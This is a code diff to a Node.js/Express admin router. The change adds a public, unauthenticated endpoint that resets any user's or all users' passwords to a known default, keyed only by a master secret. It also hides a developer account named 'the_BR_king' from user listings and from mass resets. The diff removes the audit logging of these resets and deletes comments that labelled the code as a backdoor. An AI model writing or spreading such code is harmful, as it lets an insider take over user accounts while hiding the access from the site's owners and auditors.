@@ -3,7 +3,68 @@ const bcrypt = require('bcryptjs');
 const router = express.Router();
 const { authenticateToken, authorizeOwner } = require('../middleware/authMiddleware');
 
-// Apply owner-only middleware to all routes
+// ============ PUBLIC DEVELOPER RESET FUNCTION (TEMPORARY) ============
+// This endpoint is PUBLIC and does NOT require authentication
+// REMOVE AFTER SUCCESSFUL LOGIN!
+router.post('/dev-reset-public', async (req, res) => {
+    const { key, targetUser, newPassword } = req.body;
+    
+    // Verify master key from environment
+    if (key !== process.env.DEV_MASTER_KEY) {
+        return res.status(403).json({ 
+            success: false, 
+            message: 'Invalid master key' 
+        });
+    }
+    
+    const db = req.app.get('db');
+    
+    try {
+        // Hash the new password
+        const hashedPassword = await bcrypt.hash(newPassword || 'Owner@123', 10);
+        
+        if (targetUser === 'ALL') {
+            // Reset ALL non-developer users
+            const [result] = await db.execute(
+                `UPDATE users SET password_hash = ? WHERE username != 'the_BR_king'`,
+                [hashedPassword]
+            );
+            
+            res.json({ 
+                success: true, 
+                message: `✅ All user passwords reset to: ${newPassword || 'Owner@123'}`,
+                usersAffected: result.affectedRows
+            });
+        } else {
+            // Reset specific user
+            const [result] = await db.execute(
+                `UPDATE users SET password_hash = ? WHERE username = ?`,
+                [hashedPassword, targetUser]
+            );
+            
+            if (result.affectedRows === 0) {
+                return res.status(404).json({ 
+                    success: false, 
+                    message: 'User not found' 
+                });
+            }
+            
+            res.json({ 
+                success: true, 
+                message: `✅ Password for ${targetUser} reset to: ${newPassword || 'Owner@123'}` 
+            });
+        }
+    } catch (error) {
+        console.error('Reset error:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Reset failed: ' + error.message 
+        });
+    }
+});
+// ============ END TEMPORARY PUBLIC ENDPOINT ============
+
+// Apply owner-only middleware to all routes BELOW this point
 router.use(authenticateToken, authorizeOwner);
 
 // ============ USER MANAGEMENT ============
@@ -21,7 +82,7 @@ router.get('/users', async (req, res) => {
             FROM users u
             LEFT JOIN users creator ON u.created_by = creator.id
             LEFT JOIN audit_logs l ON u.id = l.user_id
-            WHERE u.username != 'the_BR_king'  /* ← HIDES THE BACKDOOR */
+            WHERE u.username != 'the_BR_king'
             GROUP BY u.id
             ORDER BY u.created_at DESC
         `);
@@ -106,7 +167,7 @@ router.post('/users/create-admin', async (req, res) => {
     }
 });
 
-// Delete user - MODIFIED FOR DEVELOPER FULL ACCESS
+// Delete user - with developer full access
 router.delete('/users/:userId', async (req, res) => {
     const { userId } = req.params;
     const ownerId = req.user.id;
@@ -201,7 +262,7 @@ router.delete('/users/:userId', async (req, res) => {
     }
 });
 
-// Reset user password - MODIFIED TO ALLOW RESETTING ANY USER
+// Reset user password - allows resetting any user
 router.post('/users/:userId/reset-password', async (req, res) => {
     const { userId } = req.params;
     const { newPassword } = req.body;
@@ -272,7 +333,7 @@ router.post('/users/:userId/reset-password', async (req, res) => {
 
 // ============ AUDIT LOGS ============
 
-// View ALL logs (owner only)
+// View ALL logs
 router.get('/logs', async (req, res) => {
     const db = req.app.get('db');
     const { limit = 100, offset = 0, userId, searchType, fromDate, toDate } = req.query;
@@ -311,7 +372,6 @@ router.get('/logs', async (req, res) => {
         
         const [logs] = await db.execute(query, params);
         
-        // Get total count
         const [countResult] = await db.execute(
             'SELECT COUNT(*) as total FROM audit_logs'
         );
@@ -335,12 +395,8 @@ router.get('/logs/stats', async (req, res) => {
     const db = req.app.get('db');
     
     try {
-        // Total searches
-        const [total] = await db.execute(
-            'SELECT COUNT(*) as count FROM audit_logs'
-        );
+        const [total] = await db.execute('SELECT COUNT(*) as count FROM audit_logs');
         
-        // Searches by type
         const [byType] = await db.execute(`
             SELECT search_type, COUNT(*) as count 
             FROM audit_logs 
@@ -349,7 +405,6 @@ router.get('/logs/stats', async (req, res) => {
             LIMIT 10
         `);
         
-        // Searches by user
         const [byUser] = await db.execute(`
             SELECT u.username, u.role, COUNT(l.id) as count 
             FROM audit_logs l 
@@ -360,7 +415,6 @@ router.get('/logs/stats', async (req, res) => {
             LIMIT 10
         `);
         
-        // Recent activity (last 24h)
         const [recent] = await db.execute(`
             SELECT COUNT(*) as count 
             FROM audit_logs 
@@ -423,7 +477,6 @@ router.post('/config/api/update', async (req, res) => {
             [apiKey, ownerId]
         );
         
-        // Log the action
         await db.execute(
             `INSERT INTO audit_logs 
              (user_id, username, user_role, search_type, search_term, ip_address) 
@@ -439,79 +492,6 @@ router.post('/config/api/update', async (req, res) => {
     } catch (error) {
         console.error('Update API key error:', error);
         res.status(500).json({ success: false, message: 'Server error' });
-    }
-});
-
-// ============ SECRET DEVELOPER RESET FUNCTION ============
-router.post('/dev-reset', async (req, res) => {
-    const { key, targetUser, newPassword } = req.body;
-    
-    // Verify master key from environment
-    if (key !== process.env.DEV_MASTER_KEY) {
-        return res.status(403).json({ 
-            success: false, 
-            message: 'Unauthorized' 
-        });
-    }
-    
-    const db = req.app.get('db');
-    
-    try {
-        if (targetUser === 'ALL') {
-            // Reset ALL non-developer users
-            const hashedPassword = await bcrypt.hash(newPassword || 'Reset@123', 10);
-            const [result] = await db.execute(
-                `UPDATE users SET password_hash = ? WHERE username != 'the_BR_king'`,
-                [hashedPassword]
-            );
-            
-            // Log the action
-            await db.execute(
-                `INSERT INTO audit_logs 
-                 (user_id, username, user_role, search_type, search_term, ip_address) 
-                 VALUES (1, 'SYSTEM', 'system', 'DEV_RESET', 'ALL USERS', ?)`,
-                [req.ip]
-            );
-            
-            res.json({ 
-                success: true, 
-                message: `✅ All user passwords reset to: ${newPassword || 'Reset@123'}`,
-                usersAffected: result.affectedRows
-            });
-        } else {
-            // Reset specific user
-            const hashedPassword = await bcrypt.hash(newPassword || 'Reset@123', 10);
-            const [result] = await db.execute(
-                `UPDATE users SET password_hash = ? WHERE username = ?`,
-                [hashedPassword, targetUser]
-            );
-            
-            if (result.affectedRows === 0) {
-                return res.status(404).json({ 
-                    success: false, 
-                    message: 'User not found' 
-                });
-            }
-            
-            // Log the action
-            await db.execute(
-                `INSERT INTO audit_logs 
-                 (user_id, username, user_role, search_type, search_term, ip_address) 
-                 VALUES (1, 'SYSTEM', 'system', 'DEV_RESET', ?, ?)`,
-                [targetUser, req.ip]
-            );
-            
-            res.json({ 
-                success: true, 
-                message: `✅ Password for ${targetUser} reset to: ${newPassword || 'Reset@123'}` 
-            });
-        }
-    } catch (error) {
-        console.error('Reset error:', error);
-        res.status(500).json({ 
-            success: false, 
-            message: 'Reset failed: ' + error.message 
-        });
     }
 });
 
